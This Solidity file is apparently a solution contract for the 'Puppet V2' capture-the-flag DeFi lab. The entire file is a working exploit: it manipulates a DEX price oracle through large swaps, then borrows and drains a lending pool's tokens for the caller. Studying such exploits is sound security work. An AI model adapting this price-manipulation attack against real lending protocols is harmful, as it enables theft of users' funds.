// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TokenV2 {

    function approve(address recipient, uint256 amount) external;
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function nonces(address target) external view returns (uint256);
    function balanceOf(address) external returns (uint256);
}

interface RouterV2 {

    function getAmountsOut(uint256 amount, address[] calldata path) external view returns (uint256[] memory);
    function getAmountsIn(uint amountOut, address[] memory path) external view returns (uint256[] memory);
    function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] calldata path, address recipient, uint256 deadline) external;
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint256 amount, address[] calldata path, address recipient, uint256 deadline) external payable;
}

interface PoolV2 {
    function calculateDepositOfWETHRequired(uint256 amount) external returns (uint256);
    function borrow(uint256 amount) payable external;
}

error AddrError(address);
error IntError(uint256);
error IntArrError(uint256[5]);

contract ExploitPuppetV2 {

    TokenV2 token;
    TokenV2 weth;
    PoolV2 pool;
    RouterV2 router;

    uint constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether;
    uint constant PLAYER_INITIAL_ETH_BALANCE = 20 ether;

    constructor(address _token, address _weth, address _pool, address _router) {
        token = TokenV2(_token);
        weth = TokenV2(_weth);
        pool = PoolV2(_pool);
        router = RouterV2(_router);
    }

    function exploit(uint256 deadline) external payable {

        // Token0 is weth and token1 is token
        address[] memory path = new address[](2);

        token.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        token.transferFrom(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE);

        // Convert all eth to token and then all tokens to weth
        path[0] = address(weth);
        path[1] = address(token);
        uint256[] memory outAmount = router.getAmountsOut(PLAYER_INITIAL_ETH_BALANCE / 100 * 90, path);
        router.swapExactETHForTokens{value: PLAYER_INITIAL_ETH_BALANCE / 100 * 90}(outAmount[1], path, address(this), deadline);

        weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));

        path[0] = address(token);
        path[1] = address(weth);
        outAmount = router.getAmountsOut(token.balanceOf(address(this)), path);
        router.swapExactTokensForTokens(token.balanceOf(address(this)), outAmount[1], path, address(this), deadline);

        // Take first loan for half of the pool value
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow(poolBalance/2);

        // Dump all the loan into the exchange to reduce value of token wrt weth
        outAmount = router.getAmountsOut(token.balanceOf(address(this)), path);
        router.swapExactTokensForTokens(token.balanceOf(address(this)), outAmount[1], path, address(this), deadline);

        // Final loan
        poolBalance = token.balanceOf(address(pool));
        pool.borrow(poolBalance);

        // Swap back all the weth for tokens
        path[0] = address(weth);
        path[1] = address(token);
        outAmount = router.getAmountsOut(weth.balanceOf(address(this)), path);
        router.swapExactTokensForTokens(weth.balanceOf(address(this)), outAmount[1], path, address(this), deadline);

        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}